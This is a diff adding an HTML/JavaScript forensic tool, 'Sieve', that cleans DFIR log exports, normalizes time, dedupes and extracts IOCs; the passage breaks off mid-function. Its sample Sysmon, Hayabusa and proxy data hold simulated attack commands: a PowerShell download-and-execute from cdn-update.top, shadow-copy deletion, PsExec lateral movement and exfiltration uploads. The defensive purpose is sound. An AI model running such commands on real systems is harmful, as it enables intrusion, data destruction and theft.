@@ -1,0 +1,482 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Sieve · DFIR Data Shaper</title>
+<meta name="description" content="Shake raw DFIR exports into clean CSVs: map columns, normalize time to UTC, dedupe, pull IOCs, and send the result to Mill or Spoke.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23181f1c'/%3E%3Cpath d='M6 9h20l-7 9v6l-6 3v-9z' fill='none' stroke='%23e0a83a' stroke-width='2.4' stroke-linejoin='round'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Familjen+Grotesk:wght@500;700&family=Public+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: three-stage flow (Load → Map → Output) on a fine-mesh ground; stats strip sits between config and output. */
+:root{
+  --bg:#edf0ee; --panel:#f8faf9; --ink:#17201d; --muted:#5b6a64; --line:#cfd8d4; --mesh:#dde3e0;
+  --accent:#9a6a0c; --accent-ink:#ffffff; --accent-soft:#f3e6c8;
+  --ok:#2d7a4f; --warn:#a4570d; --bad:#b0322b; --chip:#e4eae7;
+  --f-display:"Familjen Grotesk","Helvetica Neue",Arial,sans-serif;
+  --f-body:"Public Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --f-mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --bg:#111614; --panel:#18201d; --ink:#e3eae7; --muted:#93a39c; --line:#2c3833; --mesh:#1a221f;
+  --accent:#e0a83a; --accent-ink:#1a1408; --accent-soft:#3a2f17;
+  --ok:#6cc792; --warn:#e9a25a; --bad:#ef7d74; --chip:#232d29; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#111614; --panel:#18201d; --ink:#e3eae7; --muted:#93a39c; --line:#2c3833; --mesh:#1a221f;
+  --accent:#e0a83a; --accent-ink:#1a1408; --accent-soft:#3a2f17;
+  --ok:#6cc792; --warn:#e9a25a; --bad:#ef7d74; --chip:#232d29; color-scheme:dark}
+*{box-sizing:border-box}
+:root{padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+[hidden]{display:none!important}
+img{max-width:100%}
+header a.home{color:var(--muted);font-size:13px;text-decoration:none}
+header a.home:hover{color:var(--accent)}
+body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.5 var(--f-body);
+  background-image:repeating-linear-gradient(0deg,var(--mesh) 0 1px,transparent 1px 14px),repeating-linear-gradient(90deg,var(--mesh) 0 1px,transparent 1px 14px);}
+.wrap{max-width:1280px;margin:0 auto;padding-block:28px 60px;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));display:grid;gap:20px}
+header{display:flex;flex-wrap:wrap;align-items:flex-end;justify-content:space-between;gap:12px}
+h1{font:700 44px/1 var(--f-display);margin:0;letter-spacing:-.02em}
+h1 small{font:500 15px var(--f-body);color:var(--muted);letter-spacing:0;margin-left:10px}
+.tag{font:500 13px var(--f-body);color:var(--muted);max-width:52ch;margin:6px 0 0}
+.stages{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:20px}
+@media (max-width:860px){.stages{grid-template-columns:minmax(0,1fr)}}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px;display:grid;gap:14px;align-content:start;min-width:0}
+.ph{display:flex;align-items:baseline;gap:10px}
+.ph b{font:700 13px var(--f-mono);color:var(--accent-ink);background:var(--accent);border-radius:4px;padding:1px 7px}
+.ph h2{font:700 20px var(--f-display);margin:0}
+.ph span{color:var(--muted);font-size:13px;margin-left:auto}
+label.lbl,.lbl{font:600 11px var(--f-body);text-transform:uppercase;letter-spacing:.08em;color:var(--muted)}
+.row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+button,select,input[type=text],input[type=number]{font:500 13px var(--f-body);color:var(--ink);background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:7px 10px}
+button{cursor:pointer}
+button:hover{border-color:var(--accent)}
+button .ico{width:18px;height:18px;vertical-align:-4px;margin-right:7px;border-radius:4px;background:#f4f6f8;padding:1px}
+button.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent);font-weight:600}
+button.on{background:var(--accent-soft);border-color:var(--accent)}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+textarea{width:100%;min-height:150px;resize:vertical;font:12px/1.5 var(--f-mono);color:var(--ink);background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:10px;white-space:pre;overflow:auto}
+.drop{border:1.5px dashed var(--line);border-radius:8px;padding:14px;text-align:center;color:var(--muted);font-size:13px}
+.drop.over{border-color:var(--accent);background:var(--accent-soft)}
+.drop label{color:var(--accent);font-weight:600;cursor:pointer;text-decoration:underline}
+.map{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px 14px}
+@media (max-width:480px){.map{grid-template-columns:minmax(0,1fr)}}
+.map div{display:grid;gap:4px;min-width:0}
+.map select{width:100%}
+.slots{display:grid;gap:4px}
+.slots select+select{font-size:12px;padding:5px 8px;color:var(--muted)}
+.map .auto{font:400 11px var(--f-mono);color:var(--ok)}
+.opts{display:grid;gap:10px}
+.chk{display:flex;gap:8px;align-items:center;font-size:14px}
+.stats{display:grid;grid-template-columns:repeat(6,minmax(0,1fr));gap:1px;background:var(--line);border:1px solid var(--line);border-radius:10px;overflow:hidden}
+@media (max-width:860px){.stats{grid-template-columns:repeat(3,minmax(0,1fr))}}
+.stat{background:var(--panel);padding:12px 14px;min-width:0}
+.stat .v{font:700 24px var(--f-display);font-variant-numeric:tabular-nums}
+.stat .k{font-size:12px;color:var(--muted)}
+.stat.warn .v{color:var(--warn)} .stat.bad .v{color:var(--bad)} .stat.ok .v{color:var(--ok)}
+.stat .v.small{font-size:14px;font-family:var(--f-mono);font-weight:500;line-height:1.4;padding-top:6px;overflow-wrap:anywhere}
+.tabs{display:flex;flex-wrap:wrap;gap:6px}
+.tabs button{border-radius:999px;padding:6px 14px}
+.out-head{display:flex;flex-wrap:wrap;justify-content:space-between;gap:10px;align-items:center}
+.tablebox{overflow-x:auto;border:1px solid var(--line);border-radius:8px;max-height:420px;overflow-y:auto}
+table{border-collapse:collapse;width:100%;font:12px/1.45 var(--f-mono);font-variant-numeric:tabular-nums}
+th{position:sticky;top:0;background:var(--chip);text-align:left;font-weight:600;padding:7px 10px;border-bottom:1px solid var(--line);white-space:nowrap}
+td{padding:6px 10px;border-bottom:1px solid var(--line);white-space:nowrap;max-width:420px;overflow:hidden;text-overflow:ellipsis}
+tr:last-child td{border-bottom:0}
+.pill{display:inline-block;font:500 11px var(--f-body);padding:1px 8px;border-radius:999px;background:var(--chip);color:var(--muted)}
+.pill.priv{color:var(--warn)}
+.note{font-size:13px;color:var(--muted);margin:0}
+.toast{font-size:13px;color:var(--ok);min-height:1.2em}
+details summary{cursor:pointer;font-size:13px;color:var(--muted)}
+details textarea{min-height:90px;margin-top:8px}
+.sr{position:absolute;left:-9999px}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div>
+      <a class="home" href="/tools/">jon.glass / Tools</a>
+      <h1>Sieve <small>/siv/</small></h1>
+      <p class="tag">Shake raw evidence into clean CSVs. Map columns once, normalize time to UTC, drop the noise, and get output ready for Mill and Spoke. Nothing leaves your browser.</p>
+    </div>
+    <div class="row">
+      <label class="lbl" for="sample">Example data</label>
+      <select id="sample">
+        <option value="sysmon">Sysmon process creation (CSV)</option>
+        <option value="hayabusa">Hayabusa detections (CSV)</option>
+        <option value="proxy">Proxy log (NDJSON, epoch time)</option>
+      </select>
+    </div>
+  </header>
+
+  <div class="stages">
+    <section class="panel" aria-labelledby="h-load">
+      <div class="ph"><b>1</b><h2 id="h-load">Load</h2><span id="srcinfo">—</span></div>
+      <div class="drop" id="drop">Drop a CSV, TSV, JSON or NDJSON file here, <label for="file">choose a file</label>, or paste below.
+        <input type="file" id="file" class="sr" accept=".csv,.tsv,.txt,.json,.ndjson,.jsonl,.log">
+      </div>
+      <textarea id="raw" spellcheck="false" aria-label="Raw evidence"></textarea>
+      <div class="row"><button class="primary" id="parse">Parse</button><span class="note" id="parsenote"></span></div>
+    </section>
+
+    <section class="panel" aria-labelledby="h-map">
+      <div class="ph"><b>2</b><h2 id="h-map">Map &amp; clean</h2><span>each field uses its first filled column</span></div>
+      <div class="map" id="map"></div>
+      <div class="opts">
+        <div class="row">
+          <label class="lbl" for="tz">Timestamps without a zone are</label>
+          <select id="tz"></select>
+        </div>
+        <label class="chk"><input type="checkbox" id="dedupe" checked> Remove duplicate rows</label>
+        <div class="row">
+          <label class="chk"><input type="checkbox" id="merge" checked> Merge the same process start logged by two sources within</label>
+          <input type="number" id="mergewin" min="0" max="60" step="0.5" value="2" style="width:70px" aria-label="Merge window in seconds"><span class="note">sec</span>
+        </div>
+        <label class="chk"><input type="checkbox" id="shortproc" checked> Use process file names, not full paths, in edges</label>
+        <div style="display:grid;gap:4px">
+          <label class="lbl" for="exclude">Drop rows containing (comma separated)</label>
+          <input type="text" id="exclude" placeholder="e.g. svchost.exe, windowsupdate.com">
+        </div>
+        <details>
+          <summary>Recipe: copy or apply a saved mapping</summary>
+          <textarea id="recipe" spellcheck="false" aria-label="Recipe JSON"></textarea>
+          <div class="row" style="margin-top:8px"><button id="copyrecipe">Copy recipe</button><button id="applyrecipe">Apply recipe</button></div>
+        </details>
+      </div>
+    </section>
+  </div>
+
+  <div class="stats" id="stats"></div>
+
+  <section class="panel" aria-labelledby="h-out">
+    <div class="ph"><b>3</b><h2 id="h-out">Output</h2><span id="outinfo"></span></div>
+    <div class="out-head">
+      <div class="tabs" role="tablist" id="tabs">
+        <button data-t="mill" class="on">Mill timeline</button>
+        <button data-t="spoke">Spoke edges</button>
+        <button data-t="ioc">IOCs</button>
+      </div>
+      <div class="row" id="outopts"></div>
+    </div>
+    <div class="tablebox"><table id="preview"></table></div>
+    <div class="row"><button class="primary" id="sendout">Send to Mill</button><button id="dlout">Download CSV</button><button id="copyout">Copy CSV</button><span class="toast" id="toast" role="status"></span></div>
+    <textarea id="outtext" spellcheck="false" aria-label="Output CSV" hidden></textarea>
+  </section>
+</div>
+
+<script>
+const SAMPLES={
+sysmon:`UtcTime,Computer,User,EventID,ParentImage,Image,CommandLine,Hashes
+2026-10-21 14:02:55.103,WS-FIN-07,CORP\\mreyes,1,C:\\Windows\\explorer.exe,C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE,"""WINWORD.EXE"" /n ""C:\\Users\\mreyes\\Downloads\\Q3_invoice.docm""",SHA256=4f8c2a9d1b7e6c5a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a
+2026-10-21 14:03:11.482,WS-FIN-07,CORP\\mreyes,1,C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE,C:\\Windows\\System32\\cmd.exe,"cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA",MD5=9e107d9d372bb6826bd81d3542a419d6
+2026-10-21 14:03:12.020,WS-FIN-07,CORP\\mreyes,1,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"powershell -nop -w hidden -c iwr http://cdn-update.top/a.ps1 | iex",SHA256=a3b1c2d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90
+2026-10-21 14:03:12.020,WS-FIN-07,CORP\\mreyes,1,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"powershell -nop -w hidden -c iwr http://cdn-update.top/a.ps1 | iex",SHA256=a3b1c2d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90
+2026-10-21 14:03:40.611,WS-FIN-07,CORP\\mreyes,1,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Users\\mreyes\\AppData\\Local\\Temp\\svc_host.exe,C:\\Users\\mreyes\\AppData\\Local\\Temp\\svc_host.exe -c 185.220.101.47:443,SHA1=2fd4e1c67a2d28fced849ee1bb76e7391b93eb12
+2026-10-21 14:04:02.900,WS-FIN-07,NT AUTHORITY\\SYSTEM,1,C:\\Windows\\System32\\services.exe,C:\\Windows\\System32\\svchost.exe,C:\\Windows\\system32\\svchost.exe -k netsvcs,
+2026-10-21 14:05:17.337,WS-FIN-07,CORP\\mreyes,1,C:\\Users\\mreyes\\AppData\\Local\\Temp\\svc_host.exe,C:\\Windows\\System32\\whoami.exe,whoami /all,
+2026-10-21 14:05:21.004,WS-FIN-07,CORP\\mreyes,1,C:\\Users\\mreyes\\AppData\\Local\\Temp\\svc_host.exe,C:\\Windows\\System32\\nltest.exe,nltest /dclist:corp.local,
+2026-10-21 14:09:48.215,WS-FIN-07,CORP\\mreyes,1,C:\\Users\\mreyes\\AppData\\Local\\Temp\\svc_host.exe,C:\\Windows\\System32\\net.exe,net use \\\\SRV-FILE-02\\c$ /user:CORP\\svc_backup,
+2026-10-21 14:11:03.562,SRV-FILE-02,CORP\\svc_backup,1,C:\\Windows\\System32\\services.exe,C:\\Windows\\PSEXESVC.exe,C:\\Windows\\PSEXESVC.exe,
+2026-10-21 14:11:05.118,SRV-FILE-02,CORP\\svc_backup,1,C:\\Windows\\PSEXESVC.exe,C:\\Windows\\System32\\cmd.exe,cmd.exe /c vssadmin delete shadows /all /quiet,
+2026-10-21 14:12:30.777,SRV-FILE-02,NT AUTHORITY\\SYSTEM,1,C:\\Windows\\System32\\services.exe,C:\\Windows\\System32\\svchost.exe,C:\\Windows\\system32\\svchost.exe -k LocalService,`,
+hayabusa:`Timestamp,RuleTitle,Level,Computer,Channel,EventID,RecordID,Details
+2026-10-21 10:03:11.482 -04:00,Suspicious Office Child Process,high,WS-FIN-07.corp.local,Sec,4688,88213,Proc: C:\\Windows\\System32\\cmd.exe ¦ ParentProc: WINWORD.EXE ¦ User: mreyes
+2026-10-21 10:03:12.020 -04:00,Encoded PowerShell,high,WS-FIN-07.corp.local,PwSh,4104,88219,ScriptBlock: iwr http://cdn-update.top/a.ps1 | iex
+2026-10-21 10:04:02.900 -04:00,Logon (Network),info,DC-01.corp.local,Sec,4624,551902,User: svc_backup ¦ SrcIP: 10.20.4.77 ¦ Type: 3
+2026-10-21 10:09:48.215 -04:00,Explicit Credential Use,medium,WS-FIN-07.corp.local,Sec,4648,88291,TgtUser: svc_backup ¦ TgtSvr: SRV-FILE-02
+2026-10-21 10:11:03.562 -04:00,PsExec Service Installed,high,SRV-FILE-02.corp.local,Sys,7045,31877,Svc: PSEXESVC ¦ Path: C:\\Windows\\PSEXESVC.exe
+2026-10-21 10:11:05.118 -04:00,Shadow Copy Deletion,crit,SRV-FILE-02.corp.local,Sec,4688,31880,Cmd: vssadmin delete shadows /all /quiet
+2026-10-21 10:13:44.010 -04:00,Security Log Cleared,high,SRV-FILE-02.corp.local,Sec,1102,31881,User: svc_backup
+2026-10-21 10:13:44.010 -04:00,Security Log Cleared,high,SRV-FILE-02.corp.local,Sec,1102,31881,User: svc_backup`,
+proxy:`{"ts":1792591392,"client_ip":"10.20.4.77","user":"mreyes","method":"GET","url":"http://cdn-update.top/a.ps1","dest_ip":"203.0.113.88","status":200,"bytes":4211}
+{"ts":1792591420,"client_ip":"10.20.4.77","user":"mreyes","method":"CONNECT","url":"185.220.101.47:443","dest_ip":"185.220.101.47","status":200,"bytes":918223}
+{"ts":1792591431,"client_ip":"10.20.4.12","user":"jpatel","method":"GET","url":"https://www.windowsupdate.com/v9/manifest.cab","dest_ip":"13.107.4.50","status":200,"bytes":15022}
+{"ts":1792591502,"client_ip":"10.20.4.77","user":"mreyes","method":"POST","url":"https://paste-drop.xyz/api/upload","dest_ip":"198.51.100.23","status":201,"bytes":2048810}
+{"ts":1792591530,"client_ip":"10.20.4.31","user":"agordon","method":"GET","url":"https://intranet.corp.local/home","dest_ip":"10.20.1.5","status":200,"bytes":31002}
+{"ts":1792591588,"client_ip":"10.20.4.77","user":"mreyes","method":"CONNECT","url":"185.220.101.47:443","dest_ip":"185.220.101.47","status":200,"bytes":1204}
+{"ts":1792591588,"client_ip":"10.20.4.77","user":"mreyes","method":"CONNECT","url":"185.220.101.47:443","dest_ip":"185.220.101.47","status":200,"bytes":1204}
+{"ts":1792591650,"client_ip":"10.20.4.12","user":"jpatel","method":"GET","url":"https://www.windowsupdate.com/v9/patch.cab","dest_ip":"13.107.4.50","status":200,"bytes":88001}`
+};
+const SAMPLE_NAMES={sysmon:"sysmon_eid1.csv",hayabusa:"hayabusa_results.csv",proxy:"proxy_2026-10-21.ndjson"};
+
+// Each field: preferred column names (in order), then a fallback pattern. Up to 3 columns per field; first non-empty wins per row.
+const FIELDS=[
+ {k:"timestamp",l:"Timestamp",max:1,pref:["@timestamp","UtcTime","TimeCreated","Timestamp","timestamp","datetime","EventTime","ts","time","date"],re:/utctime|timestamp|^time|date|^ts$|epoch|created/i},
+ {k:"host",l:"Host",pref:["Computer","Hostname","ComputerName","DeviceName","Workstation","WorkstationName","host","hostname"],re:/computer|^host|device|workstation|machine|endpoint/i},
+ {k:"user",l:"User",pref:["User","SubjectUserName","TargetUserName","AccountName","UserName","user","username","account"],re:/^user|username|accountname|subjectusername/i},
+ {k:"parent",l:"Parent process",pref:["ParentImage","ParentProcessName","ParentProcessPath","parent_process","ParentProc"],re:/parent(image|process|proc)?(name|path)?$/i},
+ {k:"process",l:"Process",pref:["Image","NewProcessName","ProcessName","ServiceFileName","ImagePath","SourceImage","Application","process","ProcessPath"],re:/^image$|processname|processpath|newprocess|^proc$|exe$/i},
+ {k:"src",l:"Source IP",pref:["SourceIp","SourceAddress","IpAddress","src_ip","client_ip","SrcIP","src"],re:/src.?ip|source.?(ip|address)|client.?ip|^ip(address)?$/i},
+ {k:"dst",l:"Destination",pref:["DestinationIp","DestAddress","DestinationHostname","dest_ip","dst_ip","url","QueryName","dst"],re:/dst|dest|^url$|remote.?(address|ip)/i},
+ {k:"event",l:"Event description",pref:["RuleTitle","CommandLine","ScriptBlockText","ServiceName","Details","Message","title","message","method","action"],re:/title|message|desc|commandline|details|method|action/i}
+];
+const SKIP=/(id|guid|sid|type|port|value|count|version|level|logonid|handle|mask)$/i;
+const blank=v=>v==null||(v=(v+"").trim())===""||v==="-";
+const $=s=>document.querySelector(s);
+const S={headers:[],rows:[],map:{},auto:{},dataset:"",tab:"mill",edge:"parent>process",defang:false,out:"",autoKeys:new Set()};
+
+// tz options
+(()=>{const sel=$("#tz");for(let h=-12;h<=14;h++){const o=document.createElement("option");o.value=h*60;o.textContent=h===0?"UTC":"UTC"+(h>0?"+":"−")+Math.abs(h);if(h===0)o.selected=true;sel.appendChild(o);}})();
+
+function parseCSV(text){
+  const first=text.split(/\r?\n/,1)[0]||"";
+  const counts={",":(first.match(/,/g)||[]).length,"\t":(first.match(/\t/g)||[]).length,"|":(first.match(/\|/g)||[]).length};
+  const d=Object.keys(counts).sort((a,b)=>counts[b]-counts[a])[0];
+  const rows=[];let row=[],f="",q=false;
+  for(let i=0;i<text.length;i++){const c=text[i];
+    if(q){if(c==='"'){if(text[i+1]==='"'){f+='"';i++;}else q=false;}else f+=c;}
+    else if(c==='"'&&f==="")q=true;
+    else if(c===d){row.push(f);f="";}
+    else if(c==="\n"||c==="\r"){if(c==="\r"&&text[i+1]==="\n")i++;row.push(f);f="";if(row.some(x=>x!==""))rows.push(row);row=[];}
+    else f+=c;}
+  row.push(f);if(row.some(x=>x!==""))rows.push(row);
+  const headers=(rows.shift()||[]).map((h,i)=>h.trim()||"col"+(i+1));
+  return {headers,rows:rows.map(r=>Object.fromEntries(headers.map((h,i)=>[h,(r[i]??"").trim()])))};
+}
+function flatten(o,p="",out={}){for(const[k,v]of Object.entries(o||{})){const key=p?p+"."+k:k;if(v&&typeof v==="object"&&!Array.isArray(v))flatten(v,key,out);else out[key]=Array.isArray(v)?v.join("; "):(v??"")+"";}return out;}
+function parseJSON(text){
+  let arr;const t=text.trim();
+  try{const j=JSON.parse(t);arr=Array.isArray(j)?j:(Array.isArray(j.records)?j.records:[j]);}
+  catch(e){arr=t.split(/\r?\n/).filter(l=>l.trim()).map(l=>JSON.parse(l));}
+  const rows=arr.map(o=>flatten(o));const hs=[];rows.forEach(r=>Object.keys(r).forEach(k=>{if(!hs.includes(k))hs.push(k)}));
+  return {headers:hs,rows};
+}
+function parseTs(v,off){
+  if(v==null)return null;v=(v+"").trim();if(!v)return null;let m;
+  if(/^\d{10}(\.\d+)?$/.test(v))return new Date(parseFloat(v)*1000);
+  if(/^\d{13}$/.test(v))return new Date(+v);
+  if(/^\d{17,18}$/.test(v))return new Date(Number(BigInt(v)/10000n)-11644473600000);
+  v=v.replace(/\s+([+-]\d\d:?\d\d)$/,"$1");
+  if(/([zZ]|[+-]\d\d:?\d\d)$/.test(v)){const d=new Date(v.replace(" ","T"));return isNaN(d)?null:d;}
+  if((m=v.match(/^(\d{4})-(\d\d)-(\d\d)[ T](\d\d):(\d\d)(?::(\d\d)(\.\d+)?)?$/)))
+    return new Date(Date.UTC(+m[1],m[2]-1,+m[3],+m[4],+m[5],+(m[6]||0),Math.round(parseFloat(m[7]||0)*1000))-off*60000);
+  if((m=v.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})[ ,T]+(\d{1,2}):(\d\d)(?::(\d\d))?\s*(AM|PM)?$/i))){
+    let h=+m[4];if(m[7]){const pm=m[7].toUpperCase()==="PM";if(h===12)h=pm?12:0;else if(pm)h+=12;}
+    return new Date(Date.UTC(+m[3],m[1]-1,+m[2],h,+m[5],+(m[6]||0))-off*60000);}
+  return null;
+}
+function autoMap(headers,rows){
+  const used=new Set(),map={},filled=h=>rows.some(r=>!blank(r[h]));
+  for(const f of FIELDS){
+    const lower=Object.fromEntries(headers.map(h=>[h.toLowerCase(),h]));
+    const cands=[];
+    for(const p of f.pref){const h=headers.includes(p)?p:lower[p.toLowerCase()];if(h&&!cands.includes(h))cands.push(h);}
+    for(const h of headers)if(f.re.test(h)&&!SKIP.test(h)&&!cands.includes(h))cands.push(h);
+    map[f.k]=cands.filter(h=>!used.has(h)&&filled(h)).slice(0,f.max||3);
+    map[f.k].forEach(h=>used.add(h));
+  }
+  return map;
+}
+function srcOf(n){return pick(n._raw,["Channel","channel","Provider","ProviderName","SourceName","log_name"]).toLowerCase();}
+function pick(r,cols){for(const c of cols||[])if(!blank(r[c]))return (r[c]+"").trim();return "";}
+function load(text,name){
+  $("#raw").value=text;S.dataset=name||"pasted";parse();
+}
+function parse(){
+  const text=$("#raw").value;
+  try{
+    const t=text.trim();const p=(t[0]==="{"||t[0]==="[")?parseJSON(t):parseCSV(text);
+    S.headers=p.headers;S.rows=p.rows;S.map=autoMap(p.headers,p.rows);S.autoKeys=new Set(Object.keys(S.map).filter(k=>S.map[k].length));
+    $("#parsenote").textContent=`${p.rows.length} rows · ${p.headers.length} columns`;
+    $("#srcinfo").textContent=S.dataset;
+  }catch(e){
+    S.headers=[];S.rows=[];S.map={};
+    $("#parsenote").textContent="Couldn't read this as CSV or JSON. Check that the first line is a header row, or that each JSON line is a complete object.";
+  }
+  renderMap();run();
+}
+function renderMap(){
+  const box=$("#map");box.innerHTML="";
+  FIELDS.forEach(f=>{
+    const d=document.createElement("div");
+    const cols=S.map[f.k]||(S.map[f.k]=[]);const max=f.max||3;
+    const slots=cols.length<max?cols.concat([""]):cols.slice();
+    const sel=(v,i)=>`<select id="m_${f.k}_${i}" data-i="${i}" aria-label="${f.l}${i?" fallback "+i:""}">`+
+      [`<option value="">${i?"+ add fallback":"— none —"}</option>`].concat(S.headers.map(h=>`<option ${v===h?"selected":""} value="${esc(h)}">${esc(h)}</option>`)).join("")+`</select>`;
+    d.innerHTML=`<label class="lbl" for="m_${f.k}_0">${f.l}</label><div class="slots">${slots.map(sel).join("")}</div>`+
+      (S.autoKeys.has(f.k)&&cols.length?'<span class="auto">auto'+(cols.length>1?": first filled of "+cols.length:"")+'</span>':'');
+    d.querySelectorAll("select").forEach(s=>s.addEventListener("change",e=>{const i=+e.target.dataset.i;const v=e.target.value;
+      if(v)cols[i]=v;else cols.splice(i,1);S.map[f.k]=cols.filter(Boolean);S.autoKeys.delete(f.k);renderMap();run();}));
+    box.appendChild(d);
+  });
+  updateRecipe();
+}
+function esc(s){return (s+"").replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));}
+function csvCell(v){v=v==null?"":v+"";return /[",\n\r]/.test(v)?'"'+v.replace(/"/g,'""')+'"':v;}
+function toCSV(cols,rows){return [cols.join(",")].concat(rows.map(r=>cols.map(c=>csvCell(r[c])).join(","))).join("\n");}
+function base(p){return p?p.split(/[\\/]/).pop():p;}
+
+const IOC_RE={
+ url:/\bhttps?:\/\/[^\s"'<>,|¦]+/gi,
+ sha256:/\b[a-f0-9]{64}\b/gi, sha1:/\b[a-f0-9]{40}\b/gi, md5:/\b[a-f0-9]{32}\b/gi,
+ ipv4:/\b(?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.(?:25[0-5]|2[0-4]\d|1?\d?\d)){3}\b/g,
+ domain:/\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|ru|cn|xyz|top|info|biz|co|us|uk|de|me|app|dev|cloud|site|online|club|live|shop|su|tk|gov|edu|local)\b/gi
+};
+function isPriv(ip){return /^(10\.|192\.168\.|127\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip);}
+function defang(t,v){if(!S.defang)return v;let x=v.replace(/^http/i,"hxxp");if(t==="ipv4"||t==="domain"||t==="url")x=x.replace(/\./g,"[.]");return x;}
+
+let R={};
+function run(){
+  const off=+$("#tz").value, excl=$("#exclude").value.split(",").map(s=>s.trim().toLowerCase()).filter(Boolean);
+  const m=S.map;let filtered=0,dupes=0,bad=0;const seen=new Set(),kept=[];
+  for(const r of S.rows){
+    const all=Object.values(r).join(" ").toLowerCase();
+    if(excl.some(t=>all.includes(t))){filtered++;continue;}
+    const key=JSON.stringify(r);
+    if($("#dedupe").checked){if(seen.has(key)){dupes++;continue;}seen.add(key);}
+    const hasTs=(m.timestamp||[]).length;const d=hasTs?parseTs(pick(r,m.timestamp),off):null;
+    if(hasTs&&!d)bad++;
+    const g=k=>pick(r,m[k]);
+    const n={timestamp:d?d.toISOString():"",host:g("host"),user:g("user"),process:g("process"),parent:g("parent"),src:g("src"),dst:g("dst"),event:g("event"),_raw:r,_t:d?d.getTime():Infinity};
+    if(!n.event){const ch=pick(r,["Channel","channel","Provider","SourceName"]),id=pick(r,["EventID","EventId","event_id"]);
+      n.event=[ch&&id?`${ch} ${id}`:id?`Event ${id}`:"",base(n.process),n.dst].filter(Boolean).join(" · ");}
+    if(n.event.length>300)n.event=n.event.slice(0,300)+"…";
+    kept.push(n);
+  }
+  kept.sort((a,b)=>a._t-b._t);
+  // Cross-source merge: same host + parent + process within the window (e.g. Sysmon EID 1 and Security 4688)
+  let merged=0;
+  if($("#merge").checked){
+    const win=Math.max(0,+$("#mergewin").value||0)*1000,last=new Map(),out=[];
+    for(const n of kept){
+      if(!n.parent||!n.process||!isFinite(n._t)){out.push(n);continue;}
+      const k=[n.host.split(".")[0],base(n.parent),base(n.process)].join("|").toLowerCase();
+      const p=last.get(k);
+      if(p&&n._t-p._t<=win&&p._srcs!==undefined&&!p._srcs.has(srcOf(n))){
+        for(const f of ["user","src","dst","event"])if(!p[f]&&n[f])p[f]=n[f];
+        p._srcs.add(srcOf(n));p._merged=(p._merged||0)+1;merged++;continue;}
+      n._srcs=new Set([srcOf(n)]);last.set(k,n);out.push(n);
+    }
+    kept.length=0;kept.push(...out);
+  }
+  // IOCs
+  const iocs=new Map();
+  for(const n of kept){const txt=Object.values(n._raw).join(" \u0000 ");
+    for(const t of ["url","sha256","sha1","md5","ipv4","domain"]){
+      for(let v of (txt.match(IOC_RE[t])||[])){
+        if(t!=="url"&&t!=="ipv4")v=v.toLowerCase();
+        const k=t+"|"+v;const e=iocs.get(k)||{type:t,value:v,count:0,first_seen:n.timestamp};e.count++;iocs.set(k,e);}
+    }}
+  const ts=kept.filter(n=>n.timestamp).map(n=>n._t);
+  R={kept,filtered,dupes,merged,bad,iocs:[...iocs.values()],span:ts.length?[Math.min(...ts),Math.max(...ts)]:null};
+  renderStats();renderOut();
+}
+function renderStats(){
+  const sp=R.span?`${new Date(R.span[0]).toISOString().replace("T"," ").slice(0,19)}<br>${new Date(R.span[1]).toISOString().replace("T"," ").slice(0,19)} UTC`:"—";
+  const cells=[
+    ["Rows in",S.rows.length,""],["Kept",R.kept.length,"ok"],["Duplicates removed"+(R.merged?` (${R.merged} merged across sources)`:""),R.dupes+R.merged,(R.dupes+R.merged)?"warn":""],
+    ["Filtered out",R.filtered,R.filtered?"warn":""],["Unreadable timestamps",R.bad,R.bad?"bad":""],["Time span",sp,"span"]];
+  $("#stats").innerHTML=cells.map(([k,v,c])=>`<div class="stat ${c}"><div class="v ${c==="span"?"small":""}">${v}</div><div class="k">${k}</div></div>`).join("");
+}
+function edges(){
+  const [a,b]=S.edge.split(">"),short=$("#shortproc").checked;const rel={"parent>process":"spawned","user>host":"logged_on","src>dst":"connected_to","user>process":"ran"}[S.edge];
+  const map=new Map();
